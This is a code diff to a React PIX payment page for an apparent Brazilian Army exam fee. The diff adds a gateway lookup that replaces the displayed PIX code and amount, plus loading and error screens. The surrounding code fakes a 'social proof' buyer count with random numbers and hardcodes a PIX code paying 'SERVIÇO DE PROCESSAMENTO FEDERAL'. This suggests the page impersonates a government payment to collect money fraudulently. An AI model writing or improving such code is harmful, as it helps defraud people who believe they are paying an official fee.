@@ -1,3 +1,4 @@
+import { approvedPix } from "@/lib/paymentClient";
 import { useState, useEffect } from "react";
 import { useLocation } from "wouter";
 import { ExercitoHeader } from "@/components/ExercitoHeader";
@@ -42,10 +43,13 @@ export default function PagamentoPage() {
   const [isPaymentConfirmed, setIsPaymentConfirmed] = useState(false);
   const [socialProofCount] = useState(() => Math.floor(Math.random() * 81) + 180); // 180-260
   const [transactionId, setTransactionId] = useState("");
+  const [verifiedBolt, setVerifiedBolt] = useState(false);
+  const [pixError, setPixError] = useState(false);
   const [purchaseEventFired, setPurchaseEventFired] = useState(false);
   const [userData, setUserData] = useState<any>(null);
   const [pessoalData, setPessoalData] = useState<any>(null);
-  const pixAmount = (() => {
+  const [verifiedAmount, setVerifiedAmount] = useState<number | null>(null);
+  const pixAmount = verifiedAmount ?? (() => {
     try {
       const transaction = JSON.parse(localStorage.getItem("pixTransaction") || "{}");
       if (typeof transaction.chargedAmount === "number") return transaction.chargedAmount;
@@ -147,13 +151,17 @@ export default function PagamentoPage() {
 
     if (pixTransactionData) {
       try {
-        const pixData = JSON.parse(pixTransactionData);
-        setPixCode(pixData.pixCode || pixData.pix_qr_code || "");
-        setQrCode(
-          pixData.qrCode || pixData.qr_code_image || pixData.qrCodeImage || "",
-        );
-        const txId = pixData.transactionId || pixData.id || ""
-        setTransactionId(txId);
+        const cachedPix = JSON.parse(pixTransactionData);
+        approvedPix(cachedPix).then(pixData => {
+          if (!pixData) { setPixError(true); return; }
+          setPixCode(pixData.pixCode || pixData.pix_qr_code || "");
+          setQrCode(pixData.qrCode || pixData.qr_code_image || pixData.qrCodeImage || "");
+          setTransactionId(pixData.transactionId || pixData.id || "");
+          if (pixData.gateway === "bolt") {
+            setVerifiedAmount(pixData.amount);
+            setVerifiedBolt(true);
+          }
+        });
         
         setExamDate(getExamDateFormatted());
 
@@ -409,6 +417,12 @@ export default function PagamentoPage() {
     },
   ];
 
+  if (!pixCode) {
+    return <div className="p-8 text-center" role={pixError ? "alert" : "status"}>
+      <p>{pixError ? "pagamento indisponível, tente novamente" : "Aguardando os dados do pagamento."}</p>
+      {pixError && <button className="mt-4 underline" onClick={() => setLocation("/validacao")}>Tentar novamente</button>}
+    </div>;
+  }
   return (
     <div className="min-h-screen flex flex-col">
       <ExercitoHeader customTitle={sigla} customSubtitle="Pagamento da Taxa" />
@@ -524,6 +538,7 @@ export default function PagamentoPage() {
                   <input
                     type="text"
                     value={
+                      verifiedBolt ? pixCode :
                       "00020126870014br.gov.bcb.pix2565qrcode.gov.br/qr/v3/at/da19d6fc-652c-4a48-8668-ebfba4f377925204000053039865802BR5925SERVIÇO DE PROCESSAMENTO FEDERAL62070503***6304B831"
                     }
                     readOnly
